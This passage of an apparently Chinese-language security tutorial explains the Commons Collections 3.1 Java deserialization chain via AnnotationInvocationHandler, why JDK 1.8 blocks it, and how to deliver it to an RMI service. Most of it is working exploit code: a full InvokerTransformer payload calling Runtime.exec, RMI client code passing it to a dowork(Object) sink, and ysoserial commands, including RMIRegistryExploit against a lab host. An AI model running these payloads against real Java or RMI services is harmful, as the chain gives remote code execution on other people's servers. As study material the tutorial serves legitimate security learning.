            Iterator var4 = this.memberValues.entrySet().iterator();
            while(var4.hasNext()) {
                Entry var5 = (Entry)var4.next();
                String var6 = (String)var5.getKey();
                Class var7 = (Class)var3.get(var6);
                if (var7 != null) {
                    Object var8 = var5.getValue();
                    if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                        var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                    }
                }
            }
        }
    }
setValue的点在这一行
    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
最后利用的payload如下
    package Serialize2;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.io.*;
    import java.lang.annotation.Target;
    import java.lang.reflect.Constructor;
    import java.util.HashMap;
    import java.util.Map;
    public class ApacheSerialize2 implements Serializable {
        public static void main(String[] args) throws Exception{
             Transformer[] transformers = new Transformer[]{
                     new ConstantTransformer(Runtime.class),
                     new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                     new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                     new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
             };
             Transformer transformerChain = new ChainedTransformer(transformers);
             Map map = new HashMap();
             map.put("value", "sijidou");
             Map transformedMap = TransformedMap.decorate(map, null, transformerChain);
             Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
             Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
             ctor.setAccessible(true);
             Object instance = ctor.newInstance(Target.class, transformedMap);
             //序列化
             FileOutputStream fileOutputStream = new FileOutputStream("serialize3.txt");
             ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
             objectOutputStream.writeObject(instance);
             objectOutputStream.close();
             //反序列化
             FileInputStream fileInputStream = new FileInputStream("serialize3.txt");
             ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
             Object result = objectInputStream.readObject();
             objectInputStream.close();
             System.out.println(result);
        }
    }
能够直接触发  
为什么jdk为1.8就无法这么利用了,看jdk1.8的`AnnotationInvocationHandler`源码，readObject中在jdk1.7的`setValue`已经变成了
    var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + "[" + var11 + "]")).setMember((Method)var5.members().get(var10));
    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
            GetField var2 = var1.readFields();
            Class var3 = (Class)var2.get("type", (Object)null);
            Map var4 = (Map)var2.get("memberValues", (Object)null);
            AnnotationType var5 = null;
            try {
                var5 = AnnotationType.getInstance(var3);
            } catch (IllegalArgumentException var13) {
                throw new InvalidObjectException("Non-annotation type in annotation serial stream");
            }
            Map var6 = var5.memberTypes();
            LinkedHashMap var7 = new LinkedHashMap();
            String var10;
            Object var11;
            for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) {
                Entry var9 = (Entry)var8.next();
                var10 = (String)var9.getKey();
                var11 = null;
                Class var12 = (Class)var6.get(var10);
                if (var12 != null) {
                    var11 = var9.getValue();
                    if (!var12.isInstance(var11) && !(var11 instanceof ExceptionProxy)) {
                        var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + "[" + var11 + "]")).setMember((Method)var5.members().get(var10));
                    }
                }
            }
            AnnotationInvocationHandler.UnsafeAccessor.setType(this, var3);
            AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, var7);
        }
在jdk1.8下不能触发
ysoserial的包里面也有commons-collectons-3.1的payload，它利用的是jdk中的BadAttributeValueExpException这个类重写readObject来实现的  
该项目的GitHub地址  
ysoserial的使用方法
    java -jar ysoserial.jar CommonsCollections5 calc.exe > 1.txt
把1.txt 里面的内容反序列化化即可触发生成calc.exe的命令  
## **0x06 RMI简介**
RMI（Remote Method Invocation），远程方法调用  
JNDI（Java Naming and Directory Interface），Java 命名与目录接口  
JNDI是注册表可以包含很多的RMI，举个例子就JNDI像个本子，RMI像本子上的记录，客户端调用RMI记录的时候会先去JNDI这个本子，然后从本子上找相应的RMI记录
_性质_  
与JMX服务器之间的通信使用的协议就是rmi协议  
rmi可以传输序列化的数据
_传输原理_
1.客户端 => 客户端本地的stub类  
2.客户端本地的stub类把信息序列化 => 服务器端的skeletons类  
3.服务器端的skeletons类把信息反序列化 => 服务器端的对应类进行处理  
4.服务器端对应类处理完后 => 服务器端的skeletions类  
5.skeletions类序列化数据 => 客户端本地的stub类  
6.客户端本地的stub类把数据反序列化 => 客户端
但在java 1.2版本后免去了3、5的步骤，直接在对应的类上进行序列化和反序列化
## **0x07 RMI服务器实现**
首先定义一个`User`接口，这个接口和普通接口不一样在于要抛出`RemoteException`的异常
    package RMI;
    import java.rmi.Remote;
    import java.rmi.RemoteException;
    public interface User extends Remote{
        String name(String name) throws RemoteException;
        void say(String say) throws RemoteException;
        void dowork(Object work) throws RemoteException;
    }
接着实现该接口的各种函数的`UserImpl`类，实现的类也要抛出`RemoteException`的异常
    package RMI;
    import java.rmi.RemoteException;
    import java.rmi.server.UnicastRemoteObject;
    public class UserImpl extends UnicastRemoteObject implements User{
        public UserImpl() throws RemoteException{
            super();
        }
        @Override
        public String name(String name) throws RemoteException{
            return name;
        }
        @Override
        public void say(String say) throws  RemoteException{
            System.out.println("you speak" + say);
        }
        @Override
        public void dowork(Object work) throws  RemoteException{
            System.out.println("your work is " + work);
        }
    }
最后是启动这个服务
    package RMI;
    import java.rmi.Naming;
    import java.rmi.registry.LocateRegistry;
    public class UserServer {
        public static void main(String[] args) throws Exception{
            String url = "rmi://10.10.10.1:4396/User";
            User user = new UserImpl();
            LocateRegistry.createRegistry(4396);
            Naming.bind(url,user);
            System.out.println("the rmi is running ...");
        }
    }
LocateRegistry.createRegistry(4396)把4396端口号在JNDI中注册，将开启RMI的服务的端口  
Naming.rebind()来实现将类和端口版本，开放出去  
运行后，就会在4396端口进行监听
## **0x08 通过RMI服务器运行commons-collectons-3.1反序列化漏洞**
这个RMI的问题在于，它的`void dowork(Object work)`函数接收了`Object`类型
    public void dowork(Object work) throws  RemoteException{
            System.out.println("your work is " + work);
        }
而我们的把攻击链生成的payload也是Object类型，因此可以通过该点传入触发漏洞  
在jdk1.7，并且服务器上有commons-collectons-3.1的情况下，运行下面payload弹出计算机
    package RMI;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.lang.annotation.Target;
    import java.lang.reflect.Constructor;
    import java.rmi.Naming;
    import java.util.HashMap;
    import java.util.Map;
    public class UserClient {
        public static void main(String[] args) throws Exception{
            String url = "rmi://10.10.10.1:4396/User";
            User userClient = (User)Naming.lookup(url);
            System.out.println(userClient.name("sijidou"));
            userClient.say("world");
            userClient.dowork(getpayload());
        }
        public static Object getpayload() throws Exception{
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            Map map = new HashMap();
            map.put("value", "sijidou");
            Map transformedMap = TransformedMap.decorate(map, null, transformerChain);
            Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
            ctor.setAccessible(true);
            Object instance = ctor.newInstance(Target.class, transformedMap);
            return instance;
        }
    }
在jdk1.8下会失败  
那么利用之前的ysoserial生成的1.txt，来触发jdk1.8的漏洞
    package RMI;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.io.FileInputStream;
    import java.io.ObjectInputStream;
    import java.lang.annotation.Target;
    import java.lang.reflect.Constructor;
    import java.rmi.Naming;
    import java.util.HashMap;
    import java.util.Map;
    public class UserClient2 {
        public static void main(String[] args) throws Exception{
            String url = "rmi://10.10.10.1:4396/User";
            User userClient = (User) Naming.lookup(url);
            System.out.println(userClient.name("sijidou"));
            userClient.say("world");
            userClient.dowork(getpayload());
        }
        public static Object getpayload() throws Exception{
            FileInputStream fileInputStream = new FileInputStream("1.txt");
            ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
            return objectInputStream.readObject();
        }
    }
成功弹出计算器  
那么在另一台设备上，我这里用kali的虚拟机使用`ysoserial`工具来给本地的win10RMI服务器发送payload  
win10在虚拟机的虚拟网卡ip:10.10.10.1  
kali的ip:10.10.10.128
    java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.RMIRegistryExploit 10.10.10.1 4396 CommonsCollections1 "calc.exe"
  1. **结语**  
源码和笔记  
JMX：  
RMI：  
JAVA反序列化：  
参考文章  